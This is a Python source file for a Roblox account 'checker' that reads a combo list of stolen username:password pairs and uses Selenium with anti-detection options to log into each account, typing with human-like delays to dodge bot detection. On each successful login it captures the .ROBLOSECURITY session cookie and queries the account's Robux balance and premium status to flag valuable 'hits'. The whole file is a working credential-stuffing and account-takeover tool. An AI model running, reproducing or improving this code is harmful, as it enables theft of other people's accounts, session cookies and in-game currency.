# checker.py - Fixed driver issues for web
import os
import sys
import json
import time
import random
import threading
import queue
import logging
import re
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from enum import Enum
from dataclasses import dataclass, field

# Import dependencies
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.common.exceptions import (
        TimeoutException, NoSuchElementException,
        WebDriverException, ElementNotInteractableException,
        ElementClickInterceptedException, StaleElementReferenceException,
        InvalidSessionIdException, NoSuchWindowException
    )
    import undetected_chromedriver as uc
    from webdriver_manager.chrome import ChromeDriverManager
    import requests
except ImportError as e:
    print(f"[-] Missing dependency: {e}")
    print("[!] Please install: pip install -r requirements.txt")
    raise


@dataclass
class Account:
    username: str
    password: str
    status: str = "unchecked"
    robux: int = 0
    premium: bool = False
    friends: int = 0
    cookies: Optional[Dict] = None
    verification_time: float = 0.0
    message: str = ""
    user_id: str = ""
    display_name: str = ""
    profile_url: str = ""
    avatar_url: str = ""
    description: str = ""
    account_age: str = ""
    join_date: str = ""
    followers: int = 0
    following: int = 0
    badges: int = 0
    groups: List[Dict] = field(default_factory=list)
    groups_count: int = 0
    top_groups: str = ""
    collectibles: int = 0
    wearing_items: List[str] = field(default_factory=list)
    account_banned: bool = False


class VerificationMode(Enum):
    NORMAL = "normal"
    HEADLESS = "headless"
    STEALTH = "stealth"
    RAPID = "rapid"


class DriverManager:
    def __init__(self):
        self.active_drivers = {}
        self.driver_path = None
        self.setup_driver_path()
    
    def setup_driver_path(self):
        try:
            from webdriver_manager.chrome import ChromeDriverManager
            self.driver_path = ChromeDriverManager().install()
            print(f"[+] ChromeDriver ready: {self.driver_path}")
            return True
        except Exception as e:
            print(f"[-] Webdriver-manager failed: {e}")
            
            # Try to find ChromeDriver in common paths
            common_paths = [
                "/usr/local/bin/chromedriver",
                "/usr/bin/chromedriver",
                "/usr/lib/chromium-browser/chromedriver",
                os.path.join(os.getcwd(), "chromedriver"),
                os.path.join(os.path.expanduser("~"), "chromedriver")
            ]
            
            for path in common_paths:
                if os.path.exists(path):
                    self.driver_path = path
                    print(f"[+] Found ChromeDriver at: {self.driver_path}")
                    return True
            
            print("[-] ChromeDriver not found!")
            return False
    
    def create_driver(self, mode: VerificationMode, worker_id: int = 0):
        driver = None
        last_error = None
        
        try:
            options = Options()
            
            # Essential arguments for headless on Railway
            base_args = [
                "--disable-blink-features=AutomationControlled",
                "--disable-dev-shm-usage",
                "--no-sandbox",
                "--disable-gpu",
                "--disable-software-rasterizer",
                "--disable-setuid-sandbox",
                "--remote-debugging-port=0",
                "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            ]
            
            if mode == VerificationMode.HEADLESS:
                base_args.append("--headless=new")
                base_args.append("--window-size=1920,1080")
                base_args.append("--disable-logging")
                base_args.append("--log-level=3")
                base_args.append("--silent")
            elif mode == VerificationMode.STEALTH:
                base_args.extend([
                    "--disable-web-security",
                    "--allow-running-insecure-content",
                    "--disable-features=IsolateOrigins,site-per-process",
                ])
                options.add_experimental_option("excludeSwitches", ["enable-automation"])
                options.add_experimental_option('useAutomationExtension', False)
            
            for arg in base_args:
                options.add_argument(arg)
            
            # Additional preferences
            prefs = {
                "credentials_enable_service": False,
                "profile.password_manager_enabled": False,
                "profile.default_content_setting_values.notifications": 2,
                "intl.accept_languages": "en-US,en",
            }
            options.add_experimental_option("prefs", prefs)
            
            # Try multiple ways to create driver
            try:
                # Method 1: Use explicit driver path
                if self.driver_path and os.path.exists(self.driver_path):
                    service = Service(
                        executable_path=self.driver_path,
                        service_args=['--verbose', '--log-path=chromedriver.log']
                    )
                    if mode == VerificationMode.STEALTH:
                        driver = uc.Chrome(service=service, options=options)
                    else:
                        driver = webdriver.Chrome(service=service, options=options)
                    print(f"[+] Driver created with explicit path: {self.driver_path}")
                else:
                    raise Exception("No driver path found")
                    
            except Exception as e1:
                last_error = e1
                print(f"[-] Method 1 failed: {e1}")
                
                try:
                    # Method 2: Let webdriver-manager handle it
                    from webdriver_manager.chrome import ChromeDriverManager
                    service = Service(ChromeDriverManager().install())
                    if mode == VerificationMode.STEALTH:
                        driver = uc.Chrome(service=service, options=options)
                    else:
                        driver = webdriver.Chrome(service=service, options=options)
                    print("[+] Driver created with webdriver-manager")
                    
                except Exception as e2:
                    last_error = e2
                    print(f"[-] Method 2 failed: {e2}")
                    
                    try:
                        # Method 3: Default Chrome (assumes chromedriver in PATH)
                        if mode == VerificationMode.STEALTH:
                            driver = uc.Chrome(options=options)
                        else:
                            driver = webdriver.Chrome(options=options)
                        print("[+] Driver created with default Chrome")
                        
                    except Exception as e3:
                        last_error = e3
                        print(f"[-] Method 3 failed: {e3}")
                        raise last_error
            
            if driver is None:
                raise Exception("All driver creation methods failed")
            
            # Set timeouts
            timeout = 10 if mode == VerificationMode.RAPID else 20
            driver.set_page_load_timeout(timeout)
            driver.set_script_timeout(timeout)
            driver.implicitly_wait(5)
            
            # Store driver
            driver_id = f"worker_{worker_id}"
            self.active_drivers[driver_id] = driver
            
            return driver
            
        except Exception as e:
            print(f"[-] Error creating driver: {e}")
            print(f"[-] Last error: {last_error}")
            return None
    
    def cleanup_drivers(self):
        for driver_id, driver in self.active_drivers.items():
            try:
                driver.quit()
            except:
                pass
        self.active_drivers.clear()


class RobloxAPILookup:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def get_user_id(self, username):
        try:
            url = "https://users.roblox.com/v1/usernames/users"
            payload = {"usernames": [username], "excludeBannedUsers": False}
            response = self.session.post(url, json=payload, timeout=10)
            data = response.json().get("data", [])
            if data and len(data) > 0:
                return data[0].get("id")
            return None
        except Exception:
            return None
    
    def get_robux_balance(self, user_id, cookie):
        try:
            url = f"https://economy.roblox.com/v1/users/{user_id}/currency"
            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
            response = self.session.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                return response.json().get("robux", 0)
            return 0
        except Exception:
            return 0
    
    def check_premium_status(self, user_id, cookie):
        try:
            url = "https://premiumfeatures.roblox.com/v1/user/premium"
            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
            response = self.session.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                return response.json().get("isPremium", False)
            return False
        except Exception:
            return False
    
    def get_full_account_info(self, username: str, cookie: str = None, user_id: str = None) -> Optional[Dict]:
        try:
            if not user_id:
                user_id = self.get_user_id(username)
                if not user_id:
                    return None
            
            robux = 0
            premium = False
            if cookie:
                robux = self.get_robux_balance(user_id, cookie)
                premium = self.check_premium_status(user_id, cookie)
            
            return {
                "user_id": str(user_id),
                "robux": robux,
                "premium": premium
            }
        except Exception:
            return None


class AntraxRblxChecker:
    def __init__(self):
        self.accounts: List[Account] = []
        self.driver_manager = DriverManager()
        self.api_lookup = RobloxAPILookup()
        
        self.mode = VerificationMode.HEADLESS
        self.min_delay = 2.0
        self.max_delay = 5.0
        self.max_workers = 1
        self.max_accounts_per_test = 999999
        
        self.running = True
        self.paused = False
        self.lock = threading.Lock()
        
        self.recent_results = []
        self.all_results: List[Account] = []
        self.web_results = []
        
        self.stats = {
            'total': 0,
            'verified': 0,
            'valid': 0,
            'wrong_password': 0,
            'captcha': 0,
            'rate_limit': 0,
            'timeout': 0,
            'blocked': 0,
            'driver_error': 0,
            'other_errors': 0,
            'start_time': time.time(),
            'premium_accounts': 0,
            'total_robux': 0,
            'high_value_accounts': 0
        }
    
    def load_accounts(self, file_path: str):
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            username, password = parts
                            if username and password:
                                self.accounts.append(Account(
                                    username=username.strip(),
                                    password=password.strip()
                                ))
            
            self.stats['total'] = len(self.accounts)
            print(f"[+] {len(self.accounts)} accounts loaded")
            return True
        except Exception as e:
            print(f"[-] Error loading accounts: {e}")
            return False
    
    def get_cookie_from_driver(self, driver) -> Optional[str]:
        try:
            cookies = driver.get_cookies()
            for cookie in cookies:
                if cookie.get('name') == '.ROBLOSECURITY':
                    return cookie.get('value')
            return None
        except Exception:
            return None
    
    def safe_find_element(self, driver, selector: str, by=By.ID, timeout=5):
        try:
            element = WebDriverWait(driver, timeout).until(
                EC.presence_of_element_located((by, selector))
            )
            return element
        except Exception:
            return None
    
    def verify_account(self, account: Account, worker_id: int = 0) -> Account:
        driver = None
        start_time = time.time()
        
        if not self.running:
            account.status = "cancelled"
            account.message = "Cancelled by user"
            return account
        
        try:
            print(f"[DEBUG] Creating driver for {account.username}")
            driver = self.driver_manager.create_driver(self.mode, worker_id)
            
            if not driver:
                account.status = "driver_error"
                account.message = "Failed to create driver"
                print(f"[DEBUG] Driver creation failed for {account.username}")
                return account
            
            print(f"[DEBUG] Driver created, navigating to login for {account.username}")
            
            try:
                driver.get("https://www.roblox.com/login")
                print(f"[DEBUG] Page loaded: {driver.current_url}")
                WebDriverWait(driver, 15).until(
                    EC.presence_of_element_located((By.ID, "login-username"))
                )
                print(f"[DEBUG] Login page loaded successfully for {account.username}")
            except TimeoutException as e:
                print(f"[DEBUG] Login page timeout for {account.username}: {e}")
                account.status = "timeout"
                account.message = "Login page timeout"
                return account
            except Exception as e:
                print(f"[DEBUG] Login page error for {account.username}: {e}")
                account.status = "timeout"
                account.message = f"Page error: {str(e)[:30]}"
                return account
            
            time.sleep(random.uniform(1, 2))
            
            try:
                print(f"[DEBUG] Finding username field for {account.username}")
                username_field = self.safe_find_element(driver, "login-username", By.ID, 5)
                if not username_field:
                    print(f"[DEBUG] Username field not found for {account.username}")
                    account.status = "element_error"
                    account.message = "Username field not found"
                    return account
                
                username_field.clear()
                time.sleep(0.2)
                
                # Type username with human-like delay
                for char in account.username:
                    username_field.send_keys(char)
                    time.sleep(random.uniform(0.03, 0.07))
                print(f"[DEBUG] Username entered for {account.username}")
                time.sleep(random.uniform(0.3, 0.6))
                
                print(f"[DEBUG] Finding password field for {account.username}")
                password_field = self.safe_find_element(driver, "login-password", By.ID, 5)
                if not password_field:
                    print(f"[DEBUG] Password field not found for {account.username}")
                    account.status = "element_error"
                    account.message = "Password field not found"
                    return account
                
                password_field.clear()
                time.sleep(0.2)
                
                # Type password with human-like delay
                for char in account.password:
                    password_field.send_keys(char)
                    time.sleep(random.uniform(0.04, 0.08))
                print(f"[DEBUG] Password entered for {account.username}")
                time.sleep(random.uniform(0.3, 0.6))
                
                print(f"[DEBUG] Finding login button for {account.username}")
                login_button = self.safe_find_element(driver, "login-button", By.ID, 5)
                if not login_button:
                    print(f"[DEBUG] Login button not found for {account.username}")
                    account.status = "element_error"
                    account.message = "Login button not found"
                    return account
                
                login_button.click()
                print(f"[DEBUG] Login button clicked for {account.username}")
                
            except Exception as e:
                print(f"[DEBUG] Login interaction error for {account.username}: {e}")
                account.status = "element_error"
                account.message = f"Login error: {str(e)[:30]}"
                return account
            
            # Wait for response
            wait_time = 0
            max_wait = 25
            
            while wait_time < max_wait and self.running:
                time.sleep(1)
                wait_time += 1
                
                try:
                    current_url = driver.current_url.lower()
                    print(f"[DEBUG] {account.username} - URL: {current_url} (wait {wait_time}s)")
                    
                    # Check if login was successful
                    if any(x in current_url for x in ["/home", "/my/profile", "/users/"]):
                        print(f"[DEBUG] Login successful for {account.username}")
                        account.status = "valid"
                        account.message = "Login successful"
                        account.verification_time = time.time() - start_time
                        
                        # Get cookie and account data
                        try:
                            cookie = self.get_cookie_from_driver(driver)
                            if cookie:
                                account.cookies = {'.ROBLOSECURITY': cookie}
                                user_id = self.api_lookup.get_user_id(account.username)
                                if user_id:
                                    account.user_id = str(user_id)
                                    account.robux = self.api_lookup.get_robux_balance(user_id, cookie)
                                    account.premium = self.api_lookup.check_premium_status(user_id, cookie)
                                    print(f"[DEBUG] Account data: User ID: {user_id}, Robux: {account.robux}, Premium: {account.premium}")
                        except Exception as e:
                            print(f"[DEBUG] Error getting account data: {e}")
                        
                        return account
                    
                    # Check for error messages
                    try:
                        error_selectors = [
                            "#login-form-error",
                            "#password-error",
                            ".alert-danger",
                            ".error-message",
                            ".login-error-message",
                            "[data-testid='login-error-message']"
                        ]
                        
                        for selector in error_selectors:
                            try:
                                error_elements = driver.find_elements(By.CSS_SELECTOR, selector)
                                for el in error_elements:
                                    if el.is_displayed():
                                        error_text = el.text.lower()
                                        print(f"[DEBUG] Error text found: {error_text}")
                                        
                                        if "incorrect" in error_text or "wrong" in error_text:
                                            print(f"[DEBUG] Wrong password for {account.username}")
                                            account.status = "invalid_password"
                                            account.message = f"Wrong password: {error_text[:30]}"
                                            return account
                                        elif "rate" in error_text:
                                            print(f"[DEBUG] Rate limit for {account.username}")
                                            account.status = "rate_limit"
                                            account.message = f"Rate limited: {error_text[:30]}"
                                            return account
                                        elif "captcha" in error_text:
                                            print(f"[DEBUG] CAPTCHA for {account.username}")
                                            account.status = "captcha"
                                            account.message = "CAPTCHA detected"
                                            return account
                            except:
                                pass
                    except:
                        pass
                    
                    # Check for CAPTCHA in iframes
                    try:
                        iframes = driver.find_elements(By.TAG_NAME, "iframe")
                        for iframe in iframes:
                            src = iframe.get_attribute("src") or ""
                            if "recaptcha" in src or "captcha" in src:
                                print(f"[DEBUG] CAPTCHA detected for {account.username}")
                                account.status = "captcha"
                                account.message = "CAPTCHA detected"
                                return account
                    except:
                        pass
                    
                    # Still on login page after 15 seconds
                    if "login" in current_url and wait_time > 15:
                        print(f"[DEBUG] Still on login page after {wait_time}s for {account.username}")
                        account.status = "timeout"
                        account.message = f"Stuck on login ({wait_time}s)"
                        return account
                    
                except Exception as e:
                    print(f"[DEBUG] Error analyzing result for {account.username}: {e}")
                    continue
            
            account.status = "timeout"
            account.message = "Verification timeout"
            print(f"[DEBUG] Timeout for {account.username}")
            return account
            
        except Exception as e:
            print(f"[DEBUG] Unexpected error for {account.username}: {e}")
            account.status = "error"
            account.message = f"Error: {str(e)[:40]}"
            return account
        finally:
            if driver:
                try:
                    driver.quit()
                    print(f"[DEBUG] Driver closed for {account.username}")
                except:
                    pass
    
    def start_verification_simple(self):
        """Simple single-threaded verification for web interface"""
        if not self.accounts:
            self.web_results = ["No accounts to verify"]
            return
        
        self.running = True
        self.web_results = []
        self.recent_results = []
        self.all_results = []
        
        total = len(self.accounts[:self.max_accounts_per_test])
        
        self.web_results.append("=" * 50)
        self.web_results.append(f"STARTING VERIFICATION")
        self.web_results.append(f"Accounts: {total}")
        self.web_results.append(f"Mode: {self.mode.value}")
        self.web_results.append("=" * 50)
        
        print(f"\n[+] Starting verification of {total} accounts...")
        print(f"[+] Mode: {self.mode.value}")
        print(f"[+] Delay: {self.min_delay}-{self.max_delay}s")
        print("-" * 50)
        
        self.stats['start_time'] = time.time()
        
        for idx, account in enumerate(self.accounts[:self.max_accounts_per_test], 1):
            if not self.running:
                self.web_results.append("Stopped by user")
                break
            
            print(f"[{idx}/{total}] Checking: {account.username}")
            self.web_results.append(f"[{idx}/{total}] Checking: {account.username}")
            
            result = self.verify_account(account, idx)
            self.stats['verified'] += 1
            
            # Update stats and web results
            if result.status == 'valid':
                self.stats['valid'] += 1
                if result.premium:
                    self.stats['premium_accounts'] += 1
                if result.robux > 0:
                    self.stats['total_robux'] += result.robux
                if result.robux > 1000 or result.premium:
                    self.stats['high_value_accounts'] += 1
                
                hit_msg = f"[HIT] {result.username} | R${result.robux}"
                if result.premium:
                    hit_msg += " [PREMIUM]"
                if result.user_id:
                    hit_msg += f" | ID: {result.user_id}"
                self.web_results.append(hit_msg)
                print(f"  ✅ {hit_msg}")
                
            elif result.status == 'invalid_password':
                self.stats['wrong_password'] += 1
                msg = f"[WRONG] {result.username}"
                self.web_results.append(msg)
                print(f"  ❌ {msg}")
                
            elif result.status == 'captcha':
                self.stats['captcha'] += 1
                msg = f"[CAPTCHA] {result.username}"
                self.web_results.append(msg)
                print(f"  🤖 {msg}")
                
            elif result.status == 'timeout':
                self.stats['timeout'] += 1
                msg = f"[TIMEOUT] {result.username}"
                self.web_results.append(msg)
                print(f"  ⏱️ {msg}")
                
            elif result.status == 'rate_limit':
                self.stats['rate_limit'] += 1
                msg = f"[RATE] {result.username}"
                self.web_results.append(msg)
                print(f"  ⚠️ {msg}")
                
            elif result.status == 'blocked':
                self.stats['blocked'] += 1
                msg = f"[BLOCKED] {result.username}"
                self.web_results.append(msg)
                print(f"  🚫 {msg}")
                
            elif result.status == 'driver_error':
                self.stats['driver_error'] += 1
                msg = f"[DRIVER] {result.username}"
                self.web_results.append(msg)
                print(f"  ⚠️ {msg}")
                
            else:
                self.stats['other_errors'] += 1
                msg = f"[ERROR] {result.username}: {result.message[:30]}"
                self.web_results.append(msg)
                print(f"  ❌ {msg}")
            
            if len(self.web_results) > 200:
                self.web_results = self.web_results[-200:]
            
            if idx < total and self.running:
                delay = random.uniform(self.min_delay, self.max_delay)
                time.sleep(delay)
        
        summary = [
            "",
            "=" * 50,
            "VERIFICATION COMPLETE",
            "=" * 50,
            f"Total checked: {self.stats['verified']}",
            f"Valid hits: {self.stats['valid']}",
            f"Premium: {self.stats['premium_accounts']}",
            f"Total Robux: {self.stats['total_robux']:,}",
            "=" * 50
        ]
        
        for line in summary:
            self.web_results.append(line)
            print(line)
    
    def start_verification(self):
        """Original multi-threaded verification (for CLI use)"""
        self.start_verification_simple()


def show_banner():
    print("=" * 70)
    print("   ATX ROBLOX CHECKER")
    print("   Created by: @AntraxdevZ")
    print("=" * 70)


def get_input(prompt, default=None, input_type=str):
    while True:
        value = input(prompt)
        if not value.strip() and default is not None:
            return default
        try:
            return input_type(value.strip())
        except ValueError:
            print(f"[-] Invalid input. Please enter a valid {input_type.__name__}.")


def main():
    show_banner()
    
    print("\n" + "-" * 70)
    print("CONFIGURATION")
    print("-" * 70)
    
    while True:
        combo_file = input("\n[?] Enter combo file path (user:pass format): ").strip()
        if os.path.exists(combo_file):
            break
        print(f"[-] File not found: {combo_file}")
        print("[!] Please enter a valid file path.")
    
    max_workers = get_input("[?] How many threads? (1-10, default=1): ", default=1, input_type=int)
    if max_workers < 1:
        max_workers = 1
    if max_workers > 10:
        max_workers = 10
        print("[!] Max threads limited to 10 for stability")
    
    min_delay = get_input("[?] Minimum delay between checks (seconds, default=3): ", default=3, input_type=float)
    max_delay = get_input("[?] Maximum delay between checks (seconds, default=5): ", default=5, input_type=float)
    
    if min_delay < 1:
        min_delay = 1
    if max_delay < min_delay:
        max_delay = min_delay + 2
        print(f"[!] Adjusted max delay to {max_delay}")
    
    print("\n[?] Verification mode:")
    print("    1. Headless (Recommended - no UI)")
    print("    2. Normal (Visible browser)")
    print("    3. Stealth (Anti-detection)")
    print("    4. Rapid (Less delay between actions)")
    mode_choice = get_input("    Choose (1-4, default=1): ", default=1, input_type=int)
    
    mode_map = {
        1: VerificationMode.HEADLESS,
        2: VerificationMode.NORMAL,
        3: VerificationMode.STEALTH,
        4: VerificationMode.RAPID
    }
    mode = mode_map.get(mode_choice, VerificationMode.HEADLESS)
    
    account_limit = get_input("\n[?] Max accounts to check (0=all, default=0): ", default=0, input_type=int)
    if account_limit == 0:
        account_limit = 999999
    
    print("\n" + "-" * 70)
    print("CONFIGURATION SUMMARY")
    print("-" * 70)
    print(f"Combo file:      {combo_file}")
    print(f"Threads:         {max_workers}")
    print(f"Delay:           {min_delay}-{max_delay} seconds")
    print(f"Mode:            {mode.value}")
    print(f"Account limit:   {'All' if account_limit >= 999999 else account_limit}")
    print("-" * 70)
    
    confirm = get_input("\n[?] Start verification? (y/n, default=y): ", default='y')
    if confirm.lower() != 'y':
        print("[!] Cancelled.")
        sys.exit(0)
    
    checker = AntraxRblxChecker()
    
    checker.mode = mode
    checker.min_delay = min_delay
    checker.max_delay = max_delay
    checker.max_workers = max_workers
    checker.max_accounts_per_test = account_limit
    
    if not checker.load_accounts(combo_file):
        print("[-] Failed to load accounts. Exiting.")
        sys.exit(1)
    
    try:
        checker.start_verification()
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
        checker.running = False


if __name__ == "__main__":
    main()